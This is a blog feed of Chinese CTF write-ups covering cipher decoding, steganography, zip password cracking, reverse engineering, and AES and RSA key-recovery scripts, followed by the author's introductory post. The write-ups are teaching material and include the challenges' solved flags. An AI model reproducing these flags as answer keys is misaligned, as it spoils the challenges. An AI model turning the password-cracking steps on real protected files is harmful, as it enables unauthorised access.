class="line">&#123;</span><br><span class="line">ciphertext[i] = (plaintext[i] - <span class="string">&#x27;A&#x27;</span> + K) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (plaintext[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; plaintext[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ciphertext[i] = (plaintext[i] - <span class="string">&#x27;a&#x27;</span> + K) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ciphertext[i] = plaintext[i];</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; plaintext[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Decryption</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入密文：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">gets_s(ciphertext);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;明文为：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; ciphertext[i] != <span class="string">&#x27;\0&#x27;</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ciphertext[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ciphertext[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">plaintext[i] = ((ciphertext[i] - <span class="string">&#x27;A&#x27;</span> - K) % <span class="number">26</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ciphertext[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ciphertext[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">plaintext[i] = ((ciphertext[i] - <span class="string">&#x27;a&#x27;</span> - K) % <span class="number">26</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">plaintext[i] = ciphertext[i];</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; plaintext[i];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n, flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择（1:加密，2:解密,3:退出）：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">switch</span> (n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">Encryption();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">Decryption();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加<code>cout &lt;&lt; plaintext[i];</code>即可<br>拿到明文套上flag<br>flag: <code>flag&#123;372658619FE0707E8C64DB2400B96991&#125;</code></p><h1 id="【MISC】发售花海"><a href="#【MISC】发售花海" class="headerlink" title="【MISC】发售花海"></a>【MISC】发售花海</h1><p>hint.txt<code>❂❅❂✼❁❄✼✻❂✾❂❃❂❊❁❀=</code><br>找个网站<br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo</a><br>得到<code>JAY CHOU</code>，作为加密图片的密码<br>图片的属性中发现了steghide<br>缺少隐写的密码，看看题目名字，查找《花海》的发售日期，2008.10.15，试了一下，密码是081015，非常棒，因为默认密码是6位的123456，所以这里就猜测了6位<br><code>steghide extract -sf &#39;/var/run/vmblock-fuse/blockdir/NQpNkb/flag.jpg&#39; -p 081015</code><br>flag:<code>flag&#123;sh!ni1IuDE1eiy6nk@i&#125;</code></p><h1 id="【MISC】1小时10分钟后看海"><a href="#【MISC】1小时10分钟后看海" class="headerlink" title="【MISC】1小时10分钟后看海"></a>【MISC】1小时10分钟后看海</h1><p>先确定它是北戴河区，然后该地点是海滨汽车站，打开高德，选择搜索栏，更多，找到公交站，北戴河海滨汽车站，点进去就是801路了，有三个可能的地点<br>试了蔚蓝海岸、圣蓝海洋公园，最终确定是中间的黄金海岸，huangjinhaian<br>flag: <code>flag&#123;a69edbf339190c91f7779cb68741a5c8&#125;</code></p><h1 id="【MISC】不要骂人哦"><a href="#【MISC】不要骂人哦" class="headerlink" title="【MISC】不要骂人哦"></a>【MISC】不要骂人哦</h1><p>爬梯子游戏，很好，没看懂游戏规则QWQ<br><img src="https://picx.zhimg.com/80/v2-0d16479775d88ce72621835e4426498b_1440w.png"><br>题目：从上方任意出发点，向下走，遇到分叉（平行或向下）就沿线变化方向。 这样上面的出发点和下面结果就会一一对应。<br>嘶，看了一点官方视频，他讲完1和2的对应，我就明白了，1：下右下左，对应+；2：下下下右下右下右下右下右下，对应[；3：下左下右下，对应&gt;；依次类推，4：&lt;；5：-；6：.；7：*<br>对txt文件进行替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;&lt;&lt;+.&gt;&gt;------.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;&lt;++++++.&gt;&gt;&gt;&gt;------.&gt;&gt;+++.&lt;&lt;+++++.&lt;&lt;-.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;+++++++++.&lt;++++++++.&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;++.&lt;---.&gt;&gt;&gt;&gt;&gt;&gt;---.&lt;&lt;--.&lt;&lt;--.&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;++.&gt;-.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;-----.&gt;&gt;&gt;-.&lt;&lt;++.&lt;&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;.&lt;&lt;&lt;&lt;++.&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;---.&lt;&lt;&lt;&lt;------.</span><br></pre></td></tr></table></figure><p>很明显的Brainfuck加密<br><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>得到<code>做出这题的你期末必过！</code>继续MD5一下<br>flag：<code>flag&#123;3ea5a70772e0bb1e70655fb42ff30b0d&#125;</code></p><h1 id="【MISC】你懂二维码吗？"><a href="#【MISC】你懂二维码吗？" class="headerlink" title="【MISC】你懂二维码吗？"></a>【MISC】你懂二维码吗？</h1><p>打开压缩包，发现一张二维码以及一个压缩包，但压缩包已经损坏了，无法解压，010查看，文件头不对，修改<code>50 4B 03 04</code>，保存解压，发现里面的压缩包加密了，试一下能不能已知明文攻击，好，行不通，看二维码有什么东西<br>发现文件尾的<code>666777888</code>，是压缩包的密码，1.txt文件是一张png图片，修改后缀为png，是一张二维码，扫码发现flag：<code>flag&#123;zun_du_jia_du&#125;</code><br>emmmm，这是困难的misc？？我还以为要继续对二维码处理的呢，毕竟题目都这么说了，emmm放到中等难度吧</p><h1 id="【MISC】HIDE"><a href="#【MISC】HIDE" class="headerlink" title="【MISC】HIDE"></a>【MISC】HIDE</h1><p>解压附件，得到一张图片，两个加密的压缩包，图片属性的详细信息里告诉我们</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag有两个，随便组合一下吧！flag&#123;So&#125;</span><br></pre></td></tr></table></figure><p>好家伙藏的够深的，拉到最后有个<code>flag&#123;So&#125;</code>，还好点击它的时候感觉不对劲，一句话不可能这么长，这样子说明还有另外一个flag<br>然后就没别的信息了，binwalk分离没有信息，已知明文攻击也不行，那就直接爆破压缩包密码，1.zip破到了<code>199956</code>，得到一张二维码<br>内容是摩斯电码<code>.. .-.. --- ...- . -- .. ... -.-.</code>，解密得到<code>ilovemisc</code><br>然后也不是第二个压缩包的密码，留着当flag吧，然后第二个压缩包也没爆破出来<br>再看一眼图片，有个登录时间1999.5.6，原来是这里给的信息，但其他的试了都不是密码<br>然后我在想，这个摩斯电码解出来的会不会是大写的呢，因为我上学期打新生赛的时候有道题也是工具解出来的是全小写的，然后错了，队友交的时候跟我说是全大写。。。<br>一试还真的是全大写，这下得换个网站了，得到1.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span><br></pre></td></tr></table></figure><p>是颜文字吧，搜颜文字在线解密<br><a href="https://www.toolkk.com/tools/aaencode-encode-decode">https://www.toolkk.com/tools/aaencode-encode-decode</a><br>原来这算是AAEncode，涨见识了，得到<code>alert(&quot;flag&#123;Good&#125;&quot;);</code><br>结合前面，组合一下flag，<code>flag&#123;SoGood&#125;</code></p><h1 id="【REVERSE】一个flag劈三瓣儿"><a href="#【REVERSE】一个flag劈三瓣儿" class="headerlink" title="【REVERSE】一个flag劈三瓣儿"></a>【REVERSE】一个flag劈三瓣儿</h1><p>IDA打开，发现flag函数，cv工程师上线<br><code>flag&#123;HaiZI233N145wuD!le112@666&#125;</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>题目很多，可以说是Web手的福利局了(12道Web，全场最多)，下午五点才开始打，一直到晚上九点，主要输出是密码(这玩意算杂项吧这次的)和杂项，时间不多，就快速摸了几道简单的Web，有些Web卡壳了然后就放一边，后面再补，因为其他的题我感觉就快出了(手动狗头)，然后赛后补web，上面很多题都是赛后补的，咕噜咕噜</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;【CRYPTO】周杰伦的贝斯&quot;&gt;&lt;a href=&quot;#【CRYPTO】周杰伦的贝斯&quot; class=&quot;headerlink&quot; title=&quot;【CRYPTO】周杰伦的贝斯&quot;&gt;&lt;/a&gt;【CRYPTO】周杰伦的贝斯&lt;/h1&gt;&lt;p&gt;题目&lt;code&gt;�</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VenomCTF2024wp</title>
    <link href="https://hvang10.github.io/2024/03/16/VenomCTF2024wp/"/>
    <id>https://hvang10.github.io/2024/03/16/VenomCTF2024wp/</id>
    <published>2024-03-16T12:21:20.000Z</published>
    <updated>2024-03-17T12:50:32.182Z</updated>
    
    <content type="html"><![CDATA[<p>嘶，纳新赛，是真的要拿出实力才行的<br>真好，不出意外，Web成功爆零了QWQ<br>签到完，就打了一道crypto，rank 174</p><h1 id="Misc-checkin"><a href="#Misc-checkin" class="headerlink" title="Misc-checkin"></a>Misc-checkin</h1><p>老样子，第一步先耍一哈游戏，然后看js代码，game.js没发现什么东西<br>然后在控制台或index.js发现<code>Quick pass cheat: I heard that Venom is ChaMd5’s, here is a mysterious string for you. 88d18c420654d158d22b65626bc7a878</code><br>找个靠谱的网站进行MD5解密。。。<br><a href="https://www.somd5.com/">https://www.somd5.com/</a><br>好家伙，写wp的时候，这玩意又解不出来。。。我记得用的是这个网站的</p><h1 id="Crypto-狂飙"><a href="#Crypto-狂飙" class="headerlink" title="Crypto-狂飙"></a>Crypto-狂飙</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">key = os.urandom(<span class="number">24</span>)</span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">n = m % key</span><br></pre></td></tr></table></figure><p>已知n和m，解出key，这道题目就出了<br>嘶，一开始真的想，随机生成key来看看能不能直接get，发现没什么卵用，数量实在是太多了<br>同时，我们可以得到key是m-n的因子，然后直接对<code>m-n</code>进行了分解，得到<br><code>k = [342291058100503482469327892079792475478873,5036645362649, 265898280367, 3939851, 439, 37, 3]</code><br>然后通过key的位数以及n,m,key的关系，慢慢试，确定了key</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">m = <span class="number">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></span><br><span class="line">n = <span class="number">103560843006078708944833658339172896192389513625588</span></span><br><span class="line">k = [<span class="number">342291058100503482469327892079792475478873</span>,</span><br><span class="line">     <span class="number">5036645362649</span>, <span class="number">265898280367</span>, <span class="number">3939851</span>, <span class="number">439</span>, <span class="number">37</span>, <span class="number">3</span>]</span><br><span class="line">key = k[<span class="number">0</span>]*k[<span class="number">2</span>]*k[<span class="number">4</span>]*k[<span class="number">5</span>]</span><br><span class="line">key = (long_to_bytes(key))</span><br><span class="line">c = <span class="string">b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(c))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;cf735a4d-f9d9-5110-8a73-5017fc39b1b0&#125;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;嘶，纳新赛，是真的要拿出实力才行的&lt;br&gt;真好，不出意外，Web成功爆零了QWQ&lt;br&gt;签到完，就打了一道crypto，rank 174&lt;/p&gt;
&lt;h1 id=&quot;Misc-checkin&quot;&gt;&lt;a href=&quot;#Misc-checkin&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF_Round#19_Basic_Crypto专场</title>
    <link href="https://hvang10.github.io/2024/03/16/NSSCTF-Round-19-Basic-Crypto%E4%B8%93%E5%9C%BA/"/>
    <id>https://hvang10.github.io/2024/03/16/NSSCTF-Round-19-Basic-Crypto%E4%B8%93%E5%9C%BA/</id>
    <published>2024-03-16T07:25:27.000Z</published>
    <updated>2024-03-16T13:01:54.813Z</updated>
    
    <content type="html"><![CDATA[<p>本次比赛是密码专场，今天三场比赛要打QWQ<br>就打了第一道QWQ</p><h1 id="bestkasscn的超级简单密码"><a href="#bestkasscn的超级简单密码" class="headerlink" title="bestkasscn的超级简单密码"></a>bestkasscn的超级简单密码</h1><p>题目：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = p * <span class="number">10</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(p, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(q, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(r, <span class="number">3</span>, n)))</span><br></pre></td></tr></table></figure><p>本题的突破点是p<br>不难发现p3是p的倍数，分解发现，p3&#x3D;p^3<br>直接上脚本(送分)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">96241803526087516516438618680574139229212699224895199026126947479609515703069904259770933066463243844738712136916991719874179296797623802919752542053959297743706931240798992583332970879091497936378700193716012227086531507335444090574605921869576355704757589370608232721639204280020820678250787751406162350723</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = p * <span class="number">10</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">n = p*q*r</span><br><span class="line">c = <span class="number">11212699652154912414419576042130573737460880175860430868241856564678915039929479534373946033032215673944727767507831028500814261134142245577246925294110977629353584372842303558820509861245550773062016272543030477733653059813274587939179134498599049035104941393508776333632172797303569396612594631646093552388772109708942113683783815011735472088985078464550997064595366458370527490791625688389950370254858619018250060982532954113416688720602160768503752410505420577683484807166966007396618297253478916176712265476128018816694458551219452105277131141962052020824990732525958682439071443399050470856132519918853636638476540689226313542250551212688215822543717035669764276377536087788514506366740244284790716170847347643593400673746020474777085815046098314460862593936684624708574116108322520985637474375038848494466480630236867228454838428542365166285156741433845949358227546683144341695680712263215773807461091898003011630162481</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">0x10001</span>, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;cc10786a-cc59-a07d-5c9f-df1c55b18cd4&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本次比赛是密码专场，今天三场比赛要打QWQ&lt;br&gt;就打了第一道QWQ&lt;/p&gt;
&lt;h1 id=&quot;bestkasscn的超级简单密码&quot;&gt;&lt;a href=&quot;#bestkasscn的超级简单密码&quot; class=&quot;headerlink&quot; title=&quot;bestkasscn的超级简单密</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>The First Blog</title>
    <link href="https://hvang10.github.io/2024/02/13/The-First-Blog/"/>
    <id>https://hvang10.github.io/2024/02/13/The-First-Blog/</id>
    <published>2024-02-13T07:55:07.000Z</published>
    <updated>2024-02-27T12:13:26.399Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://picx.zhimg.com/80/v2-ff4e83e828bcc982469921a8e4fc72a7_1440w.jpeg"></p><h1 id="Hello！！！"><a href="#Hello！！！" class="headerlink" title="Hello！！！"></a>Hello！！！</h1><p>Welcome To My First Blog!</p><p><strong>I’m HvAng</strong></p><p>From广州“某不知名”大学的一名计算机专业学生，22年高考进入了这所第二志愿的大学</p><p>从未（不能太绝对哈，但也只是一丢丢，是个纯小白）接触过电脑的我，踏上了计算机这条不归路（bushi）</p><p>大一摆烂仔（不提也罢），于大一的暑假前一两个月开始接触网络安全（本身专业网络工程，acm连cf都打不明白，没那个天赋和本事，还是CTF收留我）（又是一条不归路），暑假留校学习正式启动我的CTF生涯，学了点鸡毛蒜皮（还是太菜啦），几乎以个人之姿拿下校赛二等奖（还是好水啊）</p><p>目前，学习方向是Web（当时好入门，确实，但也比较难精进），Crypto（大二有相关课程，而且个人觉得挺有意思的，也能摸出不少题），偶尔的Misc手，我Web还是好菜，得多下功夫，不然跟不上我佬Qanux（同级Pwn爹好吧）的步伐了QWQ</p><p>博客去年11月就搭好了，期末开始摆烂，时隔三个月（过年抽空）写下这第一篇blog</p><p>同专业找不到人（?），然后喜欢一个人打比赛（bushi，没找人，懒，暂时没去打开这个圈子），希望今后认识些大佬，然后争取线下单杀（）</p><p>正在猥琐发育（大佬原话）的<strong>Web手HvAng</strong>，争取寒假回校后进入校队，认真努力搞好我的Web，拿点奖，干点CTF之外的事情，为将来进军网安领域打点基础（感jio有点天真）</p><p>不管了，大学四年总得搞好一些事情吧，一件也好（挺认同大佬这句话的）</p><p><strong>未完待续……</strong></p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://picx.zhimg.com/80/v2-ff4e83e828bcc982469921a8e4fc72a7_1440w.jpeg&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Hello！！！&quot;&gt;&lt;a href=&quot;#Hello！！！&quot; class=&quot;headerlink&quot; title=&quot;Hello！！！&quot;&gt;&lt;/a&gt;Hello！！！&lt;/h1&gt;&lt;p&gt;Welcome To My First Blog!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;I’m HvAng&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From广州“某不知名”大学的一名计算机专业学生，22年高考进入了这所第二志愿的大学&lt;/p&gt;
&lt;p&gt;从未（不能太绝对哈，但也只是一丢丢，是个纯小白）接触过电脑的我，踏上了计算机这条不归路（bushi）&lt;/p&gt;
